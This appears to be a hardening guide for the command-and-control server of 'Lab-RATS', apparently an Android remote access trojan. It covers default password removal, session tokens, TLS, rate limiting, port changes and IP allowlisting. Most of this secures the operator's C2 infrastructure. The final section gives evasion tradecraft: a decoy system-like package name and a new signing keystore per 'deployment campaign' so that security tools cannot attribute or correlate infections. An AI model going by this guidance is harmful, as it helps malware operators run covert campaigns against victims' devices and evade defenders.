# 15 ⏤ Deployment Hardening Guide (Lab-RATS v1.6.0)

> **Goal**: Step-by-step technical hardening procedures to eliminate default posture risks and secure C2 transport, authentication, and forensic footprints.

---

## 1. 🔑 Default Password Hardening (`admin1337`)

- **Risk**: Default initial password `admin1337` is publicly published.
- **Hardening Procedure**:
  - Configure a unique, complex C2 password in `local.properties` before compilation:
    ```ini
    C2_PASSWORD=v8$K!mP2#9xLqZ7
    ```
  - Alternatively, update the password immediately upon first login via the C2 Settings tab. Updating the password generates a salted PBKDF2/SHA-256 hash in `SharedPreferences` and permanently revokes `admin1337`.

---

## 2. 🔓 Master Override Revocation

- **Status**: **Hardened in Codebase**.
- **Implementation**:
  - Removed `|| password === 'admin1337'` fallback from `c2-server/server.js` and `PasswordHasher.java`.
  - Once a custom password is created, `admin1337` is revoked and cannot bypass authentication.

---

## 3. 🍪 Cryptographic Session Token Generation

- **Risk**: Constant `AUTH_OK_1337` session cookies are portable across devices without expiration.
- **Hardening Procedure**:
  - Replace static session tokens in `server.js` and `FirebaseConfig.java` with cryptographically random tokens generated per server instance:
    ```javascript
    const crypto = require('crypto');
    const sessionSecret = crypto.randomBytes(32).toString('hex');
    res.setHeader('Set-Cookie', `c2_auth_token=${sessionSecret}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`);
    ```

---

## 4. 🌐 TLS Transport Encryption

- **Risk**: Direct HTTP connections on port `9191` transmit unencrypted data across local networks.
- **Hardening Procedure**:
  - **Relay Mode (Recommended)**: Route all operator traffic through your HTTPS C2 Relay URL (e.g., `https://your-c2-relay.onrender.com`). All relay communications are encrypted via TLS 1.3 by default.
  - **Direct Mode**: Front direct port `9191` connections with a TLS reverse proxy (e.g. Cloudflare Tunnel, Nginx, or `stunnel`) so unencrypted HTTP is never exposed to public WiFi or untrusted networks.

---

## 5. ⏱️ Rate Limiting & Brute-Force Lockout

- **Risk**: Absence of rate limiting makes short passwords vulnerable to rapid guessing attempts.
- **Hardening Procedure**:
  - Add IP-based attempt tracking in `PasswordHasher.java` / `server.js`:
    ```java
    // Lock out client IP for 15 minutes after 5 failed authentication attempts
    if (failedAttempts.getOrDefault(clientIp, 0) >= 5) {
        return newResponse(Response.Status.TOO_MANY_REQUESTS, "text/plain", "429: TOO MANY FAILED ATTEMPTS. LOCKED FOR 15 MINUTES.");
    }
    ```

---

## 6. 📡 Network Interface Binding Scope

- **Risk**: Binding to `0.0.0.0` listens on all active network interfaces (including tethered hotspots).
- **Hardening Procedure**:
  - Restrict NanoHTTPD server startup in `FirebaseConfig.java` to loopback `127.0.0.1` when operating exclusively over WebSocket relay mode (`C2_Tunnel.java`), isolating the port from tethered LAN devices.

---

## 7. 🎯 Source IP Subnet Allowlisting

- **Risk**: Unrestricted access allows any remote client IP that reaches the port to attempt authentication.
- **Hardening Procedure**:
  - Inspect `session.getHeaders().get("remote-addr")` in `FirebaseConfig.java` and reject connections originating outside an approved IP CIDR subnet mask.

---

## 8. 🔌 Custom Non-Standard Port Assignment

- **Risk**: Listening on default port `9191` serves as a network service fingerprint.
- **Hardening Procedure**:
  - Change the default port constant in `Constants.java`:
    ```java
    public static final int C2_PORT = 38491; // Custom non-standard port
    ```

---

## 9. 🖋️ Package Name & Signing Keystore Randomization

- **Risk**: Default package names and certificates allow security tooling to attribute and correlate campaign installs.
- **Hardening Procedure**:
  - Change `PKG_NAME` in `apk-builder/build_config.txt` to a unique decoy identifier (e.g., `com.system.device.utility`).
  - Generate a unique RSA signing keystore for each deployment campaign:
    ```bash
    keytool -genkey -v -keystore custom-campaign.jks -keyalg RSA -keysize 2048 -validity 10000 -alias campaign-alias
    ```
